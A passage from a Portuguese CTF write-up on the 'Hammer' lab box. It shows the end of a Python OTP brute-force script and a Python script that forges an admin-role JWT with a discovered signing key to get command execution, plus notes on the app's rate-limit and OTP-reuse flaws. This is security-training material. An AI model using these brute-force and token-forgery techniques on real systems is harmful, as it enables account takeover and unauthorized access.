+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> future <span style="color:#f92672">in</span> futures:
+</span></span><span style="display:flex;"><span>            future<span style="color:#f92672">.</span>result()
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> codigo_valido_encontrado<span style="color:#f92672">.</span>is_set():
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>    main()</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<h3 data-hextra-search-id="brute-force---2fa">Brute Force - 2FA<span class="hx:absolute hx:-mt-20" id="brute-force---2fa"></span>
+    <a href="#brute-force---2fa" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>Executando nosso script encontramos um código OTP válido.</p>
+<p><img src="/assets/img/posts/2025/02/hammer/brute_force_otp.png" alt="code_otp_valid"  loading="lazy" /></p>
+<p>Com um código válido conseguimos trocar a senha do usuário.</p>
+<p><img src="/assets/img/posts/2025/02/hammer/reset_password.png" alt="reset_password"  loading="lazy" /></p>
+<p>Conseguimos acessar a <em>dashboard</em> e obter nossa primeira flag!</p>
+<p><img src="/assets/img/posts/2025/02/hammer/dashboard.png" alt="dasboard"  loading="lazy" /></p>
+<h3 data-hextra-search-id="jwt">JWT<span class="hx:absolute hx:-mt-20" id="jwt"></span>
+    <a href="#jwt" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>Depois de alguns segundos é feito o logout automático da <code>dashboard</code>, é necessário inserir novamente as credenciais para acessa-lá.
+Vamos encaminhar para Burp Suite a solicitação, para entender melhor o que está ocorrendo.</p>
+<p>Primeiro é feito uma requisição <code>POST</code>.</p>
+<p><img src="/assets/img/posts/2025/02/hammer/post_index.png" alt="post_index"  loading="lazy" /></p>
+<p>Depois realizamos um <code>GET</code>em <code>/dasboard.php</code>.</p>
+<p><img src="/assets/img/posts/2025/02/hammer/get_dashboard.png" alt="get_dashboard"  loading="lazy" /></p>
+<p>O cookie recebido possui um <code>JWT</code>.
+O JWT possui um tempo de duração de 1 hora, após isso, ele é expirado e é necessário solicitar um novo token.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii92YXIvd3d3L215a2V5LmtleSJ9.yJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzM5MzgzNDI0LCJleHAiOjE3MzkzODcwMjQsImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJ1c2VyIn19.DloVp56EIpRxUunIspBJ9BGQvwuW40vog0L_qso0fiY</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>Conteúdo do <code>JWT</code>, verificamos pelo <code>https://jwt.io/</code>.</p>
+<p><img src="/assets/img/posts/2025/02/hammer/decode_JWT.png" alt="decode_jwt"  loading="lazy" /></p>
+<p>Quando executamos um comando em &ldquo;Enter command&rdquo; a página solicitada é <code>execute_command.php</code>.
+Vamos envia-la para o Burp Suite.</p>
+<p><img src="/assets/img/posts/2025/02/hammer/execute_command.png" alt="execute_command"  loading="lazy" /></p>
+<p>Mesmo após o logout automático, ainda conseguimos enviar os comandos, o JWT que temos nos campos <code>Authorization</code>e <code>Cookie</code> permite que nossa solicitação seja processada com sucesso e o token ainda não está com o tempo expirado.</p>
+<p>Verificamos o comportamento da aplicação, com o comando que enviamos, com o comando <code>ls</code>conseguimos listar os arquivos no diretório atual, além dos arquivos e diretórios que já sabíamos, também identificamos outro arquivo <code>188ade1.key</code>.</p>
+<p><img src="/assets/img/posts/2025/02/hammer/files_discover.png" alt="file_discover"  loading="lazy" /></p>
+<p>Baixamos o arquivo descoberto para a nossa máquina local.<br>
+Analisando o arquivo percebemos que pode se tratar de uma chave, para gerar JWT válido na aplicação.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>alex㉿estudos<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Downloads<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ file 188ade1.key
+</span></span><span style="display:flex;"><span>188ade1.key: ASCII text, with no line terminators
+</span></span><span style="display:flex;"><span>                                
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>alex㉿estudos<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Downloads<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat 188ade1.key
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>REDACTED<span style="color:#f92672">]</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>Apenas o comando <code>ls</code>sem nenhuma opção, está sendo permitido executar.<br>
+Tentamos executar outros comandos do Linux porém recebemos a mensagem <code>Command not allowed</code>.<br>
+Nosso usuário possui no JWT <code>role:user</code>, aparentemente, por esse motivo não conseguimos executar outros comandos, não temos a permissão necessária.</p>
+<h3 data-hextra-search-id="criando-nosso-jwt">Criando nosso JWT<span class="hx:absolute hx:-mt-20" id="criando-nosso-jwt"></span>
+    <a href="#criando-nosso-jwt" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>Como vimos no decode do JWT temos o campo <code>role</code>, podemos utiliza-lo, alterando para <code>admin</code>, utilizando a chave que encontramos em <code>/var/www/html/</code>.Para isso precisamos criar nosso JWT, vamos utilizar o python para essa tarefa.<br>
+Programa desenvolvido para criar nosso token.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> jwt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> datetime
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Definindo o header</span>
+</span></span><span style="display:flex;"><span>header <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;typ&#34;</span>: <span style="color:#e6db74">&#34;JWT&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;alg&#34;</span>: <span style="color:#e6db74">&#34;HS256&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;kid&#34;</span>: <span style="color:#e6db74">&#34;/var/www/html/188ade1.key&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Definindo o payload</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;iss&#34;</span>: <span style="color:#e6db74">&#34;http://hammer.thm&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;aud&#34;</span>: <span style="color:#e6db74">&#34;http://hammer.thm&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;iat&#34;</span>: <span style="color:#ae81ff">1739395993</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;exp&#34;</span>: <span style="color:#ae81ff">4070726400</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;data&#34;</span>: {
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;user_id&#34;</span>: <span style="color:#ae81ff">1</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;email&#34;</span>: <span style="color:#e6db74">&#34;tester@hammer.thm&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;role&#34;</span>: <span style="color:#e6db74">&#34;admin&#34;</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Chave secreta</span>
+</span></span><span style="display:flex;"><span>secret_key <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;key-256-bit-secret&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Gerando o token JWT</span>
+</span></span><span style="display:flex;"><span>token <span style="color:#f92672">=</span> jwt<span style="color:#f92672">.</span>encode(payload, secret_key, algorithm<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;HS256&#39;</span>, headers<span style="color:#f92672">=</span>header)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Exibindo o token</span>
+</span></span><span style="display:flex;"><span>print(token)</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>Criando nosso JWT com <code>role:admin</code>.</p>
+<p><img src="/assets/img/posts/2025/02/hammer/craft_JWT.png" alt="craft_jwt"  loading="lazy" /></p>
+<p>Validamos nosso JWT no site <code>https://jwt.io/</code>.<br>
+<strong>Observação, podemos gerar nosso JWT pelo site também.</strong></p>
+<p><img src="/assets/img/posts/2025/02/hammer/own_jwt.png" alt="jwt_own"  loading="lazy" /></p>
+<p>Agora no Burp realizamos uma nova requisição com o nosso novo JWT.</p>
+<p><img src="/assets/img/posts/2025/02/hammer/role_admin_command.png" alt="role_admin_command"  loading="lazy" /></p>
+<p>Temos permissão para executar outros comandos, o CTF já informa o caminho da última <code>flag</code>, vamos tentar ler o arquivo, antes de realizar uma shell reversa.</p>
+<p><img src="/assets/img/posts/2025/02/hammer/flag2.png" alt="flag2"  loading="lazy" /></p>
+<h2 data-hextra-search-id="resumo">Resumo<span class="hx:absolute hx:-mt-20" id="resumo"></span>
+    <a href="#resumo" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h2><p>Enumeramos as portas, e identificamos as portas <code>22</code> e <code>1337</code>, com a porta <code>1337</code> rodando um serviço web. Nesse servidor web, descobrimos diretórios e arquivos importantes, encontrando um e-mail válido (<code>tester@hammer.thm</code>). A partir desse e-mail, iniciamos a análise do comportamento de recuperação de senha. Entendido o comportamento de recuperação de senha e o <code>2FA</code>, desenvolvemos um script de <code>brute force</code>, conseguindo assim o código <code>OTP</code> válido. Após a alteração de senha e autenticados na <code>dashboard</code> da aplicação, realizamos uma nova enumeração e identificamos que a aplicação gerava um <code>JWT</code>, utilizado para validar quais comandos o usuário poderia executar (<code>role</code>). Com a descoberta da chave no diretório (<code>/var/www/html/</code>), geramos um novo JWT com o campo <code>role</code> alterado, obtendo assim um <code>RCE</code> e concluindo o CTF com a descoberta da última <code>flag</code>.</p>
+<h2 data-hextra-search-id="complemento">Complemento<span class="hx:absolute hx:-mt-20" id="complemento"></span>
+    <a href="#complemento" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h2><p>Nessa seção, foram colocadas algumas informações que julguei necessárias e importantes, após concluir o CTF, para complementar esse Write-Up.
+As informações descobertas foram feitas em outras análises minhas, e com ajuda de outros Write-Ups disponíveis na internet.</p>
+<h3 data-hextra-search-id="função-para-realizar-o-logout-automaticamente">Função para realizar o logout automaticamente<span class="hx:absolute hx:-mt-20" id="função-para-realizar-o-logout-automaticamente"></span>
+    <a href="#fun%c3%a7%c3%a3o-para-realizar-o-logout-automaticamente" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>É realizado o logout automaticamente da <code>dashboard</code> após alguns segundos, a função que realiza esse logout se encontra no código fonte da página.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">getCookie</span>(<span style="color:#a6e22e">name</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">value</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`; </span><span style="color:#e6db74">${</span>document.<span style="color:#a6e22e">cookie</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">parts</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">value</span>.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">`; </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">name</span><span style="color:#e6db74">}</span><span style="color:#e6db74">=`</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">parts</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">===</span> <span style="color:#ae81ff">2</span>) <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">parts</span>.<span style="color:#a6e22e">pop</span>().<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#39;;&#39;</span>).<span style="color:#a6e22e">shift</span>();
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">checkTrailUserCookie</span>() {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">trailUser</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">getCookie</span>(<span style="color:#e6db74">&#39;persistentSession&#39;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">trailUser</span>) {
+</span></span><span style="display:flex;"><span>          
+</span></span><span style="display:flex;"><span>                window.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">href</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;logout.php&#39;</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p><strong>Função</strong> <code>checkTrailUserCookie()</code>:</p>
+<ul>
+<li>Essa função chama a função <code>getCookie('persistentSession')</code> para verificar se o cookie <code>persistentSession</code> está presente.</li>
+<li>Se o cookie <code>persistentSession</code> não estiver presente (ou seja, <code>trailUser</code> é <code>null</code> ou <code>undefined</code>), a função redireciona o usuário para a página <code>logout.php</code>.</li>
+</ul>
+<p>No nosso caso está como <code>no</code>, se for definida como <code>true</code>mantemos nossa sessão aberta sem logout automáticos</p>
+<h3 data-hextra-search-id="controle-contra-brute-force">Controle contra Brute Force<span class="hx:absolute hx:-mt-20" id="controle-contra-brute-force"></span>
+    <a href="#controle-contra-brute-force" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>Quando iniciamos o processo de recuperação de senha é solicitado nosso cótido <code>OTP</code>, iniciamos com 8 tentativas, até sermos bloqueado pela aplicação.</p>
+<p>O campo que controla a quantidade é <code>Rate-Limit-Pending</code>.</p>
+<p><img src="/assets/img/posts/2025/02/hammer/pendent_limit.png" alt="limit_rate"  loading="lazy" /></p>
+<h3 data-hextra-search-id="otp-gerado">OTP gerado<span class="hx:absolute hx:-mt-20" id="otp-gerado"></span>
+    <a href="#otp-gerado" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>Em alguns momentos, ao executar o script, foi descoberto mais de um código OTP válido. Após realizar outra análise do comportamento da aplicação e ler alguns write-ups a respeito, ficou mais claro que o código OTP gerado não é válido somente na sessão em que foi solicitado, mas sim para o e-mail que está solicitando (<code>tester@hammer.thm</code>).
+Portanto, quando realizávamos uma nova requisição de recuperação de senha com um novo cookie, o código OTP gerado nos outros processos em paralelo não era descartado, podendo assim ser válido para recuperação de senha.
+O código só se tornaria inválido após o tempo de expiração ser excedido, que é de 1 hora.</p>
+<p><img src="/assets/img/posts/2025/02/hammer/otp_multiple.png" alt="otp_multiple"  loading="lazy" /></p>
+
+          
+        </div>
+        <div class="hx:mt-16"></div>
+        
+        
+      </main>
+    </article>
+  </div>
+
+      <footer class="hextra-footer hx:bg-gray-100 hx:pb-[env(safe-area-inset-bottom)] hx:dark:bg-neutral-900 hx:print:bg-transparent"><div class="hx:mx-auto hx:flex hx:gap-2 hx:py-2 hx:px-4 hextra-max-footer-width"><div class="hx:flex hx:justify-items-start ">
+    <button
+      title="Mudar a língua"
+      data-state="closed"
+      data-location=""
+      class="hextra-language-switcher hx:cursor-pointer hx:rounded-md hx:text-left hx:font-medium hx:h-7 hx:px-2 hx:text-xs hx:text-gray-600 hx:transition-colors hx:dark:text-gray-400 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:grow"
+      type="button"
+      aria-label="Mudar a língua"
+      aria-expanded="false"
+      aria-haspopup="menu"
+    >
+      <div class="hx:flex hx:items-center hx:gap-2 hx:capitalize"><svg height=12 xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9c1.657 0 3-4.03 3-9s-1.343-9-3-9m0 18c-1.657 0-3-4.03-3-9s1.343-9 3-9m-9 9a9 9 0 019-9"/></svg><span>Português</span></div>
+    </button>
+    <ul
+      class="hextra-language-options hx:hidden hx:z-20 hx:max-h-64 hx:overflow-auto hx:rounded-lg hx:border hx:border-gray-200 hx:bg-white hx:p-1 hx:text-sm hx:shadow-lg hx:dark:border-neutral-700 hx:dark:bg-neutral-900"
+      style="position: fixed; inset: auto auto 0px 0px; margin: 0px; min-width: 100px;"
+      role="menu"
+    >
+      <li role="none" class="hx:flex hx:flex-col">
+          <a
+            href="/posts/2025/2025-02-13-hammer/"
+            role="menuitem"
+            class="hx:text-gray-700 hx:dark:text-gray-300 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-neutral-800 hx:dark:hover:text-gray-100 hx:relative hx:cursor-pointer hx:whitespace-nowrap hx:rounded-sm hx:py-1.5 hx:transition-colors hx:ltr:pl-3 hx:ltr:pr-9 hx:rtl:pr-3 hx:rtl:pl-9"
+          >Português<span class="hx:absolute hx:inset-y-0 hx:flex hx:items-center hx:ltr:right-3 hx:rtl:left-3"><svg height=1em width=1em xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg></span></a>
+        </li>
+      <li role="none" class="hx:flex hx:flex-col">
+          <a
+            href="/en/"
+            role="menuitem"
+            class="hx:text-gray-700 hx:dark:text-gray-300 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-neutral-800 hx:dark:hover:text-gray-100 hx:relative hx:cursor-pointer hx:whitespace-nowrap hx:rounded-sm hx:py-1.5 hx:transition-colors hx:ltr:pl-3 hx:ltr:pr-9 hx:rtl:pr-3 hx:rtl:pl-9"
+          >English</a>
+        </li>
+      </ul>
+  </div><div class="hx:flex hx:justify-items-start hx:group" data-theme="light">
+  <button
+    title="Mudar tema"
+    data-state="closed"
+    data-location="bottom"
+    class="hextra-theme-toggle hx:cursor-pointer hx:rounded-md hx:text-left hx:font-medium hx:h-7 hx:px-2 hx:text-xs hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:font-medium hx:text-gray-600 hx:transition-colors hx:dark:text-gray-400 hx:grow"
+    type="button"
+    aria-label="Mudar tema"
+    aria-expanded="false"
+    aria-haspopup="menu"
+  >
+    <div class="hx:flex hx:items-center hx:gap-2 hx:capitalize"><svg height=12 class="hx:group-data-[theme=dark]:hidden hx:group-data-[theme=system]:hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"/></svg><span class="hx:group-data-[theme=dark]:hidden hx:group-data-[theme=system]:hidden">Claro</span><svg height=12 class="hx:group-data-[theme=light]:hidden hx:group-data-[theme=system]:hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"/></svg><span class="hx:group-data-[theme=light]:hidden hx:group-data-[theme=system]:hidden">Escuro</span><svg height=12 class="hx:group-data-[theme=dark]:hidden hx:group-data-[theme=light]:hidden" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"  fill="currentColor">
+  <path d="M 11.996094,2 C 6.4986225,2.0192368 2.03125,6.5024993 2.03125,12 c 0,5.497501 4.4673725,9.980763 9.964844,10 H 12 12.0039 c 5.497471,-0.01924 9.964844,-4.502499 9.964844,-10 0,-5.4975007 -4.467373,-9.9807632 -9.964844,-10 H 12 Z M 12,4 c 4.417218,0.017598 7.96875,3.5822356 7.96875,8 0,4.417764 -3.551532,7.982402 -7.96875,8 z" />
+</svg>
+<span class="hx:group-data-[theme=dark]:hidden hx:group-data-[theme=light]:hidden">Sistema</span></div>
+  </button>
+  <ul
+    class="hextra-theme-toggle-options hx:hidden hx:z-20 hx:max-h-64 hx:overflow-auto hx:rounded-lg hx:border hx:border-gray-200 hx:bg-white hx:p-1 hx:text-sm hx:shadow-lg hx:dark:border-neutral-700 hx:dark:bg-neutral-900"
+    style="position: fixed; inset: auto auto 0px 0px; margin: 0px; min-width: 100px;"
+    data-theme="light"
+    role="menu"
+  >
+    <li role="none" class="hx:flex hx:flex-col">
+      <button
+        type="button"
+        role="menuitemradio"
+        aria-checked="true"
+        tabindex="-1"
+        data-item="light"
+        class="hx:text-gray-700 hx:dark:text-gray-300 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-neutral-800 hx:dark:hover:text-gray-100 hx:relative hx:cursor-pointer hx:whitespace-nowrap hx:rounded-sm hx:py-1.5 hx:transition-colors hx:ltr:pl-3 hx:ltr:pr-9 hx:rtl:pr-3 hx:rtl:pl-9 hx:text-left hx:w-full hx:bg-transparent hx:border-0"
+      >
+        Claro
+         <span class="hx:absolute hx:inset-y-0 hx:flex hx:items-center hx:ltr:right-3 hx:rtl:left-3 hx:group-data-[theme=dark]:hidden hx:group-data-[theme=system]:hidden"><svg height=1em width=1em xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg></span>
+      </button>
+    </li>
+    <li role="none" class="hx:flex hx:flex-col">
+      <button
+        type="button"
+        role="menuitemradio"
+        aria-checked="false"
+        tabindex="-1"
+        data-item="dark"
+        class="hx:text-gray-700 hx:dark:text-gray-300 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-neutral-800 hx:dark:hover:text-gray-100 hx:relative hx:cursor-pointer hx:whitespace-nowrap hx:rounded-sm hx:py-1.5 hx:transition-colors hx:ltr:pl-3 hx:ltr:pr-9 hx:rtl:pr-3 hx:rtl:pl-9 hx:text-left hx:w-full hx:bg-transparent hx:border-0"
+      >
+        Escuro
+         <span class="hx:absolute hx:inset-y-0 hx:flex hx:items-center hx:ltr:right-3 hx:rtl:left-3 hx:group-data-[theme=light]:hidden hx:group-data-[theme=system]:hidden"><svg height=1em width=1em xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg></span>
+      </button>
+    </li>
+    <li role="none" class="hx:flex hx:flex-col">
+      <button
+        type="button"
+        role="menuitemradio"
+        aria-checked="false"
+        tabindex="-1"
+        data-item="system"
